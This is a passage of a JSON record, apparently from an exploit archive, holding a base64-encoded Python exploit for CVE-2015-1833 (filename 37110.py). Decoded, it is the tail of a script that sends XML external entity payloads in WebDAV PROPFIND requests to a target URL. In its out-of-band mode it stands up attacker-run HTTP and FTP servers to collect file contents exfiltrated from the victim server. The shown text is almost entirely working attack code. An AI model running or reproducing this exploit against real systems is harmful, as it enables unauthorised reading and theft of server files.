cilbMF0udGV4dC5yZXBsYWNlKCc8W0NEQVRBWycsJycpLnJlcGxhY2UoJ11dPicsJycpDQogICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICBidWZmZXJfd2l0aF9sb290ID0gJycNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICBpZiB0ZWNobmlxdWUgPT0gJ29vYic6DQogICAgICAgICAgICAgICAgcmVxdWVzdDEgPSByZXF1ZXN0c1snb29iJ11bJ1BST1BGSU5EJ10gJSB7J2ZpbGUnIDogYXJnLCAnaXAnIDogaXAsICdwb3J0JyA6IGhwb3J0fQ0KICAgICAgICAgICAgICAgIHJlcXVlc3QodXJsLCAnUFJPUEZJTkQnLCByZXF1ZXN0MSwgY3JlZHMsIHRpbWVvdXQgPSA4KQ0KDQogICAgICAgICAgICAgICAgYnVmZmVyX3dpdGhfbG9vdCA9IGZ0cF9zZXJ2ZXIuZ2V0X2xvb3QoKQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGZ0cF9zZXJ2ZXIuY2xlYW5fYnVmKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICBsZW5fID0gc3lzLmdldHNpemVvZihidWZmZXJfd2l0aF9sb290KSAtIHN5cy5nZXRzaXplb2YoJycpDQogICAgICAgICAgICBwcmludCAiXG5cMDMzWzMybWxvYWRlZCAlcyBieXRlcyBpbiBidWZmZXJcMDMzWzBtXG4iICUgbGVuXw0KICAgICAgICAgICAgaWYgbm90IGxlbl86DQogICAgICAgICAgICAgICAgcHJpbnQgJ1wwMzNbMzZtJyArIGZhaWx1cmVfZGVzY3IgKyAnXDAzM1swbScNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnRpbnVlDQoNCmRlZiBwYXJzZV9vcHRpb25zKCk6DQogICAgZ2xvYmFsIHVybCwgdGVjaCwgaXAsIGNyZWRzLCBocG9ydCwgZnBvcnQNCiAgICANCiAgICBwYXJzZXIgPSBPcHRpb25QYXJzZXIodXNhZ2UgPSB1c2FnZSkNCiAgICBwYXJzZXIuYWRkX29wdGlvbignLS11cmwnLCBkZXN0ID0gdXJsLCBoZWxwID0gJ3VybCBwYXJhbWV0ZXInKQ0KICAgIHBhcnNlci5hZGRfb3B0aW9uKCctLXRlY2gnLCBkZXN0ID0gdGVjaCwgaGVscCA9ICd0ZWNobmlxdWUsIHZhbGlkIHZhbHVlcyBhcmU6IGluYjEsIGluYjIsIG9vYicpDQogICAgcGFyc2VyLmFkZF9vcHRpb24oJy0tY3JlZHMnLCBkZXN0ID0gY3JlZHMsIGhlbHAgPSAndXNlciBjcmVkZW50aWFscywgZGVmYXVsdCB2YWx1ZSBpcyBhbm9ueW1vdXM6YW5vbnltb3VzJykNCiAgICBwYXJzZXIuYWRkX29wdGlvbignLS1pcCcsIGRlc3QgPSBpcCwgaGVscCA9ICdpcCBhZGRyZXNzIG9mIG5ldHcgaW50ZXJmYWNlIHRoYXQgeW91ciB0YXJnZXQgaXMgYWJsZSB0byBhY2Nlc3MnKQ0KICAgIHBhcnNlci5hZGRfb3B0aW9uKCctLWhwb3J0JywgZGVzdCA9IGhwb3J0LCBoZWxwID0gJ3BvcnQgZm9yIEhUVFAgc2VydmVyIHdoaWNoIHdpbGwgYmUgbGF1bmNoZWQgZHVyaW5nIGF0dGFjaywgZGVmYXVsdCBpcyA5OTk4JykNCiAgICBwYXJzZXIuYWRkX29wdGlvbignLS1mcG9ydCcsIGRlc3QgPSBmcG9ydCwgaGVscCA9ICdwb3J0IGZvciBGVFAgc2VydmVyIHdoaWNoIHdpbGwgYmUgbGF1bmNoZWQgZHVyaW5nIGF0dGFjaywgZGVmYXVsdCBpcyA5OTk5JykNCiAgICANCiAgICAob3B0aW9ucywgYXJncykgPSBwYXJzZXIucGFyc2VfYXJncygpDQogICAgDQogICAgaWYgbm90IG9wdGlvbnMudXJsIG9yIG5vdCBvcHRpb25zLnRlY2g6DQogICAgICAgIHByaW50ICd5b3UgbXVzdCBzcGVjaWZ5IHVybCBhbmQgdGVjaCBwYXJhbWV0ZXJzJw0KICAgICAgICBzeXMuZXhpdCgyKQ0KICAgICAgICANCiAgICBpZiBvcHRpb25zLnRlY2ggbm90IGluIFsnaW5iMScsICdpbmIyJywgJ29vYiddOg0KICAgICAgICBwcmludCAnaW52YWxpZCB0ZWNoIHBhcmFtZXRlcicNCiAgICAgICAgc3lzLmV4aXQoMikNCiAgICAgICAgDQogICAgaWYgb3B0aW9ucy50ZWNoICE9ICdpbmIxJyBhbmQgbm90IG9wdGlvbnMuaXA6DQogICAgICAgIHByaW50ICd5b3UgbXVzdCBzcGVjaWZ5IGlwIHBhcmFtZXRlcicNCiAgICAgICAgc3lzLmV4aXQoMikNCiAgICAgICAgDQogICAgdXJsID0gb3B0aW9ucy51cmwNCiAgICB0ZWNoID0gb3B0aW9ucy50ZWNoDQogICAgaXAgPSBvcHRpb25zLmlwDQogICAgY3JlZHMgPSBvcHRpb25zLmNyZWRzIGlmIG9wdGlvbnMuY3JlZHMgZWxzZSAnYW5vbnltb3VzOmFub255bW91cycNCiAgICBocG9ydCA9IG9wdGlvbnMuaHBvcnQgaWYgb3B0aW9ucy5ocG9ydCBlbHNlIDk5OTgNCiAgICBmcG9ydCA9IG9wdGlvbnMuZnBvcnQgaWYgb3B0aW9ucy5mcG9ydCBlbHNlIDk5OTkNCg0KcGFyc2Vfb3B0aW9ucygpDQoNCmlmIHRlY2ggIT0gJ2luYjEnOiAgDQogICAgaHR0cF9zZXJ2ZXIgPSBIVFRQX1hYRShpcCwgaHBvcnQsIGZwb3J0KQ0KICAgIGh0dHBfc2VydmVyLnJ1bigpDQogICAgDQogICAgaWYgdGVjaCA9PSAnb29iJzoNCiAgICAgICAgZnRwX3NlcnZlciA9IEZUUF9YWEUoZnBvcnQpDQogICAgICAgIGZ0cF9zZXJ2ZXIucnVuKCkNCiAgICANCmV4cGxvaXQodXJsLCB0ZWNoLCBjcmVkcykNCg0KaWYgdGVjaCAhPSAnaW5iMSc6IA0KICAgIGh0dHBfc2VydmVyLnN0b3AoKQ0KICAgIA0KaWYgdGVjaCA9PSAnb29iJzoNCiAgICBmdHBfc2VydmVyLnN0b3AoKQ==", 
    "filename": "platforms/java/webapps/37110.py", 
    "id": "37110", 
    "cves": [
        "CVE-2015-1833"
    ]
}